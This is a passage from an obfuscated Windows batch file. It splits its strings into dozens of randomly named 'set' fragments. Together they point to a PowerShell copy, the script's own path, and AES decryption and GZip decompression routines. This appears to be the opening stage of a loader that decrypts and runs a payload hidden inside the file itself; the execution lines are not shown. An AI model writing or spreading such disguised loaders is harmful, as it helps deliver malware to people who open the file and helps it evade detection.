@echo off
set "BzBcJVizHU=ws"
set "IkfAEEVWXk=we"
set "hxSnnoVEBd=in"
set "OeWQgoWIwt=xe"
set "xthNTIuQak=0\"
set "onPuirrtQK=.e"
set "HsXTAHWQDr=rS"
set "mnvxAEPHDw=32"
set "rfmCsoDrhk=s\"
set "HrwWUPFCHh=nd"
set "nQkKTaRKkl= C"
set "qYYhSqubyf=ll"
set "oYnSDItABa=Wi"
set "tOdelWSivi=ll"
set "naERCXngAn=he"
set "SFERgmnyyz=1."
set "GPnBiMIctJ=co"
set "aNyCxOvijm=Po"
set "SFfmYMhhtB=do"
set "cWDYHHePDE=rs"
set "jbjVWOArvb=\W"
set "ynFNmoSyNK= /"
set "pVGMZFfmcc=:\"
set "VYRiuJLbfW=ow"
set "oBAYrLtgaG=we"
set "amCxmIQFcP=\v"
set "FsOfCxsoEG=py"
set "fwWHcegCOj=he"
set "nUryrTTzuu=po"
set "ZCEUgqgfyT=st"
set "GqjkEXzKSk=Sy"
set "OWtupZkjJl=y "
set "XsuEIBfUEF=em"
set "rPvqItQmOU= %~dp0"
set "lBoedSNkxT=cd"
set "YUCLQWSFBR=CFxo"
set "ZmuZElzJpC=3); "
set "DXIVjcJyVa=.GZi"
set "IfTPQtdGSG=t Sy"
set "RmuWOdKAQr=oyMS"
set "twijcCVVVu=$VWk"
set "eVImWGnlMl=Conv"
set "sbfutJyCaL=null"
set "bUsrBskOSX=esMa"
set "EnshtTrvbb=l5E7"
set "IwHQVFZhIz=ILX "
set "CAJyUuFfkO=);$o"
set "EysSUEFCni=('%~f0'"
set "gbcPzNaTUo=ion."
set "LwXXFDfTFc=)))"
set "nVsdBdwmtT=:('g"
set "UkwFhHUyKC=r) {"
set "HpEwSjsmjT=1] -"
set "QlcrGUKtJZ=yste"
set "lJjyhokPyo=.Cry"
set "fHYWpfIlXj=oArr"
set "EMWdJDvFpD=y]::"
set "ZnnXKyRZJh= [Sy"
set "bDALbOHsNv=V = "
set "ofsPSMjARZ=n ''"
set "mKPdhHGuKR=stem"
set "rLAYXnzUED=Star"
set "jxhMmvsvLb=6esa"
set "EeWqffVHuD=tem."
set "tpJJuzYbEd= [st"
set "dJMOYAgMQH=x.En"
set "CEQyuxvvzU=bstr"
set "TVmqZoicEv=ct S"
set "llSOQECcoG=.Com"
set "RPOUijJUTJ=eam("
set "sfByPNGPRB=.Sec"
set "hoNATwQedb='')("
set "WILjVBSzty=morF"
set "hycBkQZVXs=ew-O"
set "mHfKwDwQGe= = $"
set "qAtHeywJfX=TllA"
set "RZEHHoWbrJ=FaDh"
set "JCIhqkuRdP=BC;$"
set "BxyjUKtkvp=.Key"
set "aDeQynQFnE=kTG."
set "JhduBhgmcV=F'[-"
set "NBLmbsbcbX=NIl."
set "BsLdbTVyPR=yMSV"
set "jIRhiBGVuV=ateD"
set "GIGdRNfiCt=[Sys"
set "NxJUNdZKto=]::("
set "WCHSxsLvmX=S46e"
set "ZgaLcIhqTY= = $"
set "mPLoeJUuYG=y.Pa"
set "LIwiyIndQN=Obje"
set "CUZKyfCEMN=();$"
set "QqoxZECiEK=$vsO"
set "BZXQjoWnNt=tE ="
set "upGaDbncDp=Obje"
set "FPWpIAfcKH=-1.."
set "JhjEjoAEpZ=Fina"
set "RBKlrUKrDw=Fdx "
set "yZnSqXigTP=ptog"
set "rbZvUUzvpD=.-16"
set "XPRHTsMPNT=ionM"
set "ACQliZINjI=E = "
set "NsdrPUMMxz=y.Cr"
set "XMjsWaKsWi=ect "
set "EJnPgcDrsK=PxEW"
set "tfRTKTlMqc=);$X"
set "KLgeDbSJbg=th('"
set "jNhZZLoAGj=[-1."
set "bFLunrGcfw=mory"
set "qwRCvfyjHj=[Sys"
set "VvbxYerkzD=kP);"
set "yeSwJzGfBD=oryS"
set "tPEmHfpORD=Comp"
set "fCNPdaWnlQ=ispo"
set "LLOZFrWoao=File"
set "KXJVkOcGyA=New-"
